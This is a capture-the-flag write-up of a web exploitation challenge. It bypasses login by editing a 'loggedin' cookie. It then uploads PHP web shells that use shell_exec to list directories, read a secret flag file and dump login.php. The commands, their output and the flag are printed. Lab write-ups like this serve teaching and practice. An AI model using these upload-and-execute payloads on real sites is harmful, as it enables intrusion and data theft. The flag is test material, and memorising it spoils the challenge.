# Interesting blog
**_Web Exploitation_** \
Difficulty: Medium

### 1. Bypass the authentication
**a. using the `loggedin` cookie** \
Change the value of this cookie using Web Dev Tools from 0 to 1 and refresh the page.
> I have personally used this method due to an obvious hint about the usage of cookies.

**b. using the hardcoded password** \
Will be explained lower.

As a result additional section that lets you upload an image should show up.

### 2. Upload a proper file
You can use this section to upload any file you want to the server.

> This site doesn't check if you actually uploaded an image or not.
There are only checks if the file isn't too heavy that aren't a threat for us in this case.

We can use this vulnerability to upload a PHP file with code that will be executed in the server.
While inspecting the website's code, I realized that all the files are uploaded to `images` folder.
Then let's list all the files in the parent folder.
```php
<?php
    print shell_exec('ls -R ..');
?>
```

_Output:_
```
..:
images
index.php
login.php
logout.php
s3krEtyT4b0r3TY
style.css
upload.php

../images:
Najlepszepiwo.jpeg
eiti.jpeg
elektryczny.jpeg
emerytura.jpeg
ja.jpeg
injection.php
prezent_urodzinowy.jpeg
wains.jpeg
```

### 3. Reading the flag
`s3krEtyT4b0r3TY` seems like a file that might contain a flag. Let's upload another PHP file to check!
```php
<?php
    print shell_exec('cat ../s3krEtyT4b0r3TY');
?>
```

### 4. Result
File: `s3krEtyT4b0r3TY` \
Flag: `EE_CTF{t0_T3n_C4Ly_4rB1TrAry_C0d3_3xeCVt10n}`

### 5. Reference to 1b)
While executing the following PHP code:
```php
<?php
    print shell_exec('cat ../login.php');
?>
```
I have noticed that there might be another vulnerability related to accessing the hardcoded password. However, I didn't find out how exactly this could be done.